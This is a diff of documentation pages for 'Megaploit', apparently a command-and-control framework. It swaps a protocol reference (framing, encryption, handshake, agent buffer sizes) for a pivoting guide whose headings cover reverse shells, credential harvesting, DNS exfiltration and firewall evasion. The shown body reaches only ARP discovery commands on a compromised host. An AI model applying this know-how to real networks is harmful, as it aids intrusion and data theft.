@@ -80,7 +80,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#megaploit-networking-communication-stack" class="md-skip">
+        <a href="#megaploit-networking-pivoting" class="md-skip">
           Skip to content
         </a>
       
@@ -762,10 +762,10 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#tldr" class="md-nav__link">
+  <a href="#overview" class="md-nav__link">
     <span class="md-ellipsis">
       
-        TL;DR
+        Overview
       
     </span>
   </a>
@@ -773,55 +773,22 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#table-of-contents" class="md-nav__link">
+  <a href="#network-discovery-from-target-perspective" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Table of Contents
+        Network Discovery (from target perspective)
       
     </span>
   </a>
   
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#1-architecture-overview" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        1. Architecture overview
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#2-layer-0-tcp-socket" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        2. Layer 0 — TCP socket
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#3-layer-1-tls-optional" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        3. Layer 1 — TLS (optional)
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="3. Layer 1 — TLS (optional)">
+    <nav class="md-nav" aria-label="Network Discovery (from target perspective)">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#auto-cert-recommended" class="md-nav__link">
+  <a href="#arp-cache-discover-lan-hosts" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Auto-cert (recommended)
+        ARP Cache — Discover LAN hosts
       
     </span>
   </a>
@@ -829,10 +796,98 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#manual-cert" class="md-nav__link">
+  <a href="#arp-scan-active-discovery-finds-hosts-even-without-icmp" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Manual cert
+        ARP Scan — Active discovery (finds hosts even without ICMP)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#icmp-ping-sweep" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ICMP Ping Sweep
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tcp-port-scan-from-target-reaches-internal-network" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        TCP Port Scan (from target, reaches internal network)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#domain-windows-network-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Domain / Windows Network Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#smb-share-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SMB Share Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#network-interfaces" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Network Interfaces
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#routing-table" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Routing Table
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#active-connections" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Active Connections
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dns-lookup-from-targets-dns-server" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        DNS Lookup (from target's DNS server)
       
     </span>
   </a>
@@ -845,110 +900,22 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#4-layer-2-hmac-sha256-authentication" class="md-nav__link">
+  <a href="#pivoting" class="md-nav__link">
     <span class="md-ellipsis">
       
-        4. Layer 2 — HMAC-SHA256 authentication
+        Pivoting
       
     </span>
   </a>
   
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#5-layer-3-protocol-version-handshake" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        5. Layer 3 — Protocol version handshake
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#6-layer-4-message-framing" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        6. Layer 4 — Message framing
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#7-layer-5-aes-256-gcm-encryption" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        7. Layer 5 — AES-256-GCM encryption
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#8-layer-6-sequence-numbers-replay-protection" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        8. Layer 6 — Sequence numbers &amp; replay protection
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#9-layer-7-json-message-encoding" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        9. Layer 7 — JSON message encoding
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#10-file-transfer-protocol" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        10. File transfer protocol
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#11-chunked-file-transfer" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        11. Chunked file transfer
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#12-websocket-transport-wstransport" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        12. WebSocket transport (WsTransport)
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="12. WebSocket transport (WsTransport)">
+    <nav class="md-nav" aria-label="Pivoting">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#websocket-handshake" class="md-nav__link">
+  <a href="#method-1-port-forwarding-portfwd" class="md-nav__link">
     <span class="md-ellipsis">
       
-        WebSocket handshake
+        Method 1 — Port Forwarding (portfwd)
       
     </span>
   </a>
@@ -956,10 +923,32 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#frame-format-rfc-6455" class="md-nav__link">
+  <a href="#method-2-socks5-proxy" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Frame format (RFC 6455)
+        Method 2 — SOCKS5 Proxy
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#method-3-reverse-shell-to-pivot" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Method 3 — Reverse Shell to Pivot
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#method-4-pivot-routes-server-side-topology" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Method 4 — Pivot Routes (Server-Side Topology)
       
     </span>
   </a>
@@ -972,10 +961,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#13-malleable-c2-profile" class="md-nav__link">
+  <a href="#pivoting-cheat-sheet" class="md-nav__link">
     <span class="md-ellipsis">
       
-        13. Malleable C2 profile
+        Pivoting Cheat Sheet
       
     </span>
   </a>
@@ -983,66 +972,22 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#14-listener-hardening-pipeline" class="md-nav__link">
+  <a href="#ssh-operations" class="md-nav__link">
     <span class="md-ellipsis">
       
-        14. Listener hardening pipeline
+        SSH Operations
       
     </span>
   </a>
   
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#15-connection-state-lifecycle" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        15. Connection state lifecycle
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#16-agent-reconnect-behaviour" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        16. Agent reconnect behaviour
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#17-complete-byte-level-trace" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        17. Complete byte-level trace
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#18-implementing-a-compatible-client" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        18. Implementing a compatible client
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="18. Implementing a compatible client">
+    <nav class="md-nav" aria-label="SSH Operations">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#step-1-tcp-connect" class="md-nav__link">
+  <a href="#ssh-connect-to-internal-host" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Step 1 — TCP connect
+        SSH connect to internal host
       
     </span>
   </a>
@@ -1050,10 +995,49 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#step-2-optional-tls" class="md-nav__link">
+  <a href="#ssh-credential-harvesting" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Step 2 — (optional) TLS
+        SSH credential harvesting
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#remote-desktop" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Remote Desktop
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#data-exfiltration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Data Exfiltration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Data Exfiltration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#http-exfiltration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        HTTP Exfiltration
       
     </span>
   </a>
@@ -1061,10 +1045,38 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#step-3-hmac-sha256-auth" class="md-nav__link">
+  <a href="#dns-exfiltration-bypasses-http-firewalls" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Step 3 — HMAC-SHA256 auth
+        DNS Exfiltration (bypasses HTTP firewalls)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#domain-operations" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Domain Operations
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Domain Operations">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#view-domain-topology" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        View domain topology
       
     </span>
   </a>
@@ -1072,10 +1084,10 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#step-4-protocol-version-handshake" class="md-nav__link">
+  <a href="#dns-based-host-discovery" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Step 4 — Protocol version handshake
+        DNS-based host discovery
       
     </span>
   </a>
@@ -1083,10 +1095,38 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#step-5-initialise-sequence-counters" class="md-nav__link">
+  <a href="#kerberos-enumeration-from-scanner-modules" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Step 5 — Initialise sequence counters
+        Kerberos enumeration (from scanner modules)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#transport-options" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Transport Options
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Transport Options">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#standard-tcp-transport" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Standard TCP Transport
       
     </span>
   </a>
@@ -1094,10 +1134,10 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#step-6-command-loop" class="md-nav__link">
+  <a href="#tls-transport" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Step 6 — Command loop
+        TLS Transport
       
     </span>
   </a>
@@ -1105,10 +1145,10 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#common-mistakes-that-cause-silent-rejection" class="md-nav__link">
+  <a href="#websocket-transport-port-80443-evasion" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Common mistakes that cause silent rejection
+        WebSocket Transport (port 80/443 evasion)
       
     </span>
   </a>
@@ -1116,10 +1156,93 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#tls-buffer-sizing-for-a-c-client" class="md-nav__link">
+  <a href="#dns-transport" class="md-nav__link">
     <span class="md-ellipsis">
       
-        TLS buffer sizing for a C client
+        DNS Transport
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#multiple-simultaneous-listeners" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Multiple Simultaneous Listeners
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#malleable-c2-profile" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Malleable C2 Profile
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#security-model" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Security Model
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Security Model">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#whats-encrypted" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What's encrypted
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#authentication-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Authentication flow
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rate-limiting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Rate limiting
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ip-allowlisting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        IP allowlisting
       
     </span>
   </a>
@@ -1213,891 +1336,364 @@
   
 
 
-<h1 id="megaploit-networking-communication-stack">Megaploit — Networking &amp; Communication Stack<a class="headerlink" href="#megaploit-networking-communication-stack" title="Permanent link">&para;</a></h1>
-<blockquote>
-<p><strong>Canonical reference for every layer between the operator console and a running agent.</strong>
-File references point to the implementation so this document stays grounded.</p>
-</blockquote>
+<h1 id="megaploit-networking-pivoting">Megaploit Networking &amp; Pivoting<a class="headerlink" href="#megaploit-networking-pivoting" title="Permanent link">&para;</a></h1>
+<p>Complete guide to network operations, pivoting through compromised hosts, and transport options.</p>
 <hr />
-<h2 id="tldr">TL;DR<a class="headerlink" href="#tldr" title="Permanent link">&para;</a></h2>
-<p>Everything that travels between the operator and an agent passes through these steps in order:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>TCP connect
-</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>  └─► (optional) TLS 1.2+ — ECDHE+AESGCM / ECDHE+CHACHA20 only
-</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>        └─► HMAC-SHA256 challenge/response  (16-byte nonce → 32-byte response)
-</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>              └─► 1-byte version handshake  (0x4D = v2 encrypted, 0x00 = v1 plain)
-</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>                    └─► per-message framing:
-</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>                          [ 4-byte BE length ]
-</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>                          [ 12-byte AES-GCM nonce ][ ciphertext ][ 16-byte tag ]
-</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>                                └─► inside plaintext:
-</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>                                      [ 8-byte BE seq ][ JSON-quoted string ]
-</span></code></pre></div>
-<p><strong>Five numbers to memorise if you're writing a client:</strong></p>
-<table>
-<thead>
-<tr>
-<th>What</th>
-<th>Value</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Length prefix</td>
-<td>4 bytes, big-endian <code>uint32</code></td>
-</tr>
-<tr>
-<td>Sequence stamp</td>
-<td>8 bytes, big-endian <code>uint64</code>, starts at 1, never repeats</td>
-</tr>
-<tr>
-<td>AES-GCM nonce</td>
-<td>12 bytes, random, prepends every ciphertext</td>
-</tr>
-<tr>
-<td>AES-GCM tag</td>
-<td>16 bytes, appended after ciphertext</td>
-</tr>
-<tr>
-<td>Payload encoding</td>
-<td>JSON <strong>string</strong> — <code>"command"</code> or <code>"response"</code>, never an object</td>
-</tr>
-</tbody>
-</table>
-<p><strong>Four buffer sizes to <code>#define</code> in a C agent:</strong></p>
-<table>
-<thead>
-<tr>
-<th>Constant</th>
-<th>Size</th>
-<th>Purpose</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>TLS_BUF_RECORD</code></td>
-<td>16,384 B</td>
-<td>RFC 5246 hard cap on any single TLS record</td>
-</tr>
-<tr>
-<td><code>TLS_BUF_SERVER_FLIGHT</code></td>
-<td>8,192 B</td>
-<td>Server's coalesced handshake burst (cert + key exchange)</td>
-</tr>
-<tr>
-<td><code>C2_APP_BUF</code></td>
-<td>65,536 B</td>
-<td>Normal post-handshake C2 frames (matches <code>BUFFER_SIZE</code>)</td>
-</tr>
-<tr>
-<td><code>MP_MAX_MSG</code></td>
-<td>256 MiB</td>
-<td>Hard ceiling — reject any frame claiming more than this</td>
-</tr>
-</tbody>
-</table>
-<p>Full details in <a href="../plugins/native_sdk/megaploit_protocol.h"><code>plugins/native_sdk/megaploit_protocol.h</code></a>.</p>
+<h2 id="overview">Overview<a class="headerlink" href="#overview" title="Permanent link">&para;</a></h2>
+<p>Megaploit provides multiple ways to:
+- <strong>Discover</strong> what's on the network from the target's perspective
+- <strong>Pivot</strong> through a compromised host to reach otherwise unreachable internal hosts
+- <strong>Exfiltrate</strong> data through constrained network paths
+- <strong>Control</strong> how agent traffic looks on the wire</p>
 <hr />
-<h2 id="table-of-contents">Table of Contents<a class="headerlink" href="#table-of-contents" title="Permanent link">&para;</a></h2>
-<ol>
-<li><a href="#1-architecture-overview">Architecture overview</a></li>
-<li><a href="#2-layer-0--tcp-socket">Layer 0 — TCP socket</a></li>
-<li><a href="#3-layer-1--tls-optional">Layer 1 — TLS (optional)</a></li>
-<li><a href="#4-layer-2--hmac-sha256-authentication">Layer 2 — HMAC-SHA256 authentication</a></li>
-<li><a href="#5-layer-3--protocol-version-handshake">Layer 3 — Protocol version handshake</a></li>
-<li><a href="#6-layer-4--message-framing">Layer 4 — Message framing</a></li>
-<li><a href="#7-layer-5--aes-256-gcm-encryption">Layer 5 — AES-256-GCM encryption</a></li>
-<li><a href="#8-layer-6--sequence-numbers--replay-protection">Layer 6 — Sequence numbers &amp; replay protection</a></li>
-<li><a href="#9-layer-7--json-message-encoding">Layer 7 — JSON message encoding</a></li>
-<li><a href="#10-file-transfer-protocol">File transfer protocol</a></li>
-<li><a href="#11-chunked-file-transfer">Chunked file transfer</a></li>
-<li><a href="#12-websocket-transport-wstransport">WebSocket transport (WsTransport)</a></li>
-<li><a href="#13-malleable-c2-profile">Malleable C2 profile</a></li>
-<li><a href="#14-listener-hardening-pipeline">Listener hardening pipeline</a></li>
-<li><a href="#15-connection-state-lifecycle">Connection state lifecycle</a></li>
-<li><a href="#16-agent-reconnect-behaviour">Agent reconnect behaviour</a></li>
-<li><a href="#17-complete-byte-level-trace">Complete byte-level trace</a></li>
-<li><a href="#18-implementing-a-compatible-client">Implementing a compatible client</a></li>
-</ol>
-<hr />
-<h2 id="1-architecture-overview">1. Architecture overview<a class="headerlink" href="#1-architecture-overview" title="Permanent link">&para;</a></h2>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>┌──────────────────────────────────────────────────────────────────────────┐
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>│                         OPERATOR MACHINE                                 │
-</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>│                                                                          │
-</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>│   CLI console  ──►  server/commands.py  ──►  core/protocol.send_msg()    │
-</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>│                                                      │                   │
-</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>│                      server/listener.py  ◄───────────┘                   │
-</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>│                      (accept loop,                                       │
-</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>│                       hardening pipeline,                                │
-</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>│                       Session objects)                                   │
-</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>└─────────────────────────────────┬────────────────────────────────────────┘
-</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>                                  │  TCP  (optionally TLS)
-</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>                                  │  optionally WebSocket-framed
-</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>                                  │
-</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>┌─────────────────────────────────▼────────────────────────────────────────┐
-</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>│                           AGENT MACHINE                                  │
-</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a>│                                                                          │
-</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>│   agent/connection.py  ──►  core/protocol.recv_msg()                     │
-</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a>│   agent/handlers.py    ◄──  dispatches commands, sends responses         │
-</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a>└──────────────────────────────────────────────────────────────────────────┘
+<h2 id="network-discovery-from-target-perspective">Network Discovery (from target perspective)<a class="headerlink" href="#network-discovery-from-target-perspective" title="Permanent link">&para;</a></h2>
+<p>These commands run on the compromised agent and show the network from inside the target's network segment.</p>
+<h3 id="arp-cache-discover-lan-hosts">ARP Cache — Discover LAN hosts<a class="headerlink" href="#arp-cache-discover-lan-hosts" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>megaploit session(1) » arp
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>192.168.10.1   00:50:56:AA:BB:CC  (gateway)
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>192.168.10.5   00:0C:29:11:22:33  (VMware)
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>192.168.10.20  00:50:56:DD:EE:FF  (VMware)
 </span></code></pre></div>
-<p><strong>Layering — bottom to top:</strong></p>
-<table>
-<thead>
-<tr>
-<th>Layer</th>
-<th>What it does</th>
-<th>Source</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>0 TCP</td>
-<td>Raw byte stream</td>
-<td>OS / stdlib <code>socket</code></td>
-</tr>
-<tr>
-<td>1 TLS</td>
-<td>Optional encryption at the transport level</td>
-<td><code>server/listener.py</code> → <code>ssl</code></td>
-</tr>
-<tr>
-<td>2 HMAC auth</td>
-<td>Shared-secret challenge/response before any data flows</td>
-<td><code>core/crypto.py</code></td>
-</tr>
-<tr>
-<td>3 Version handshake</td>
-<td>Negotiate v1 (plaintext) vs v2 (AES-GCM)</td>
-<td><code>core/protocol.py</code></td>
-</tr>
-<tr>
-<td>4 Framing</td>
-<td>4-byte length-prefixed messages</td>
-<td><code>core/protocol.py</code></td>
-</tr>
-<tr>
-<td>5 AES-256-GCM</td>
-<td>Per-message authenticated encryption</td>
-<td><code>core/protocol.py</code></td>
-</tr>
-<tr>
-<td>6 Sequence numbers</td>
-<td>Replay-attack prevention</td>
-<td><code>core/protocol.py</code></td>
-</tr>
-<tr>
-<td>7 JSON encoding</td>
-<td>Human-readable command/response payload</td>
-<td><code>core/protocol.py</code></td>
-</tr>
-<tr>
-<td>WsTransport</td>
-<td>Optional HTTP/WebSocket wrapper over layers 0–7</td>
-<td><code>core/protocol.py</code></td>
-</tr>
-<tr>
-<td>C2 Profile</td>
-<td>Traffic-shaping metadata (headers, jitter, URIs)</td>
-<td><code>core/profile.py</code></td>
-</tr>
-</tbody>
-</table>
-<hr />
-<h2 id="2-layer-0-tcp-socket">2. Layer 0 — TCP socket<a class="headerlink" href="#2-layer-0-tcp-socket" title="Permanent link">&para;</a></h2>
-<p><strong>Source:</strong> <a href="../megaploit/server/listener.py"><code>megaploit/server/listener.py</code></a>, <a href="../megaploit/core/config.py"><code>megaploit/core/config.py</code></a></p>
-<p>The server opens a plain TCP listener:</p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="n">sock</span><span class="o">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="n">sock</span><span class="o">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SO_REUSEPORT</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>  <span class="c1"># Linux only</span>
-</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="n">sock</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="n">bind_host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
-</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="n">sock</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
+<p>Shows hosts that have recently communicated. No packets sent — reads the OS cache.</p>
+<h3 id="arp-scan-active-discovery-finds-hosts-even-without-icmp">ARP Scan — Active discovery (finds hosts even without ICMP)<a class="headerlink" href="#arp-scan-active-discovery-finds-hosts-even-without-icmp" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>megaploit session(1) » arp_scan 192.168.10.0/24
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>[+] 192.168.10.1   00:50:56:AA:BB:CC
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>[+] 192.168.10.5   00:0C:29:11:22:33
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>[+] 192.168.10.20  00:50:56:DD:EE:FF
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>[+] 192.168.10.100 00:50:56:FF:11:22
 </span></code></pre></div>
-<p>Each accepted connection gets its own daemon thread immediately so the accept loop is never blocked by a slow handshake:</p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">conn</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_server_sock</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
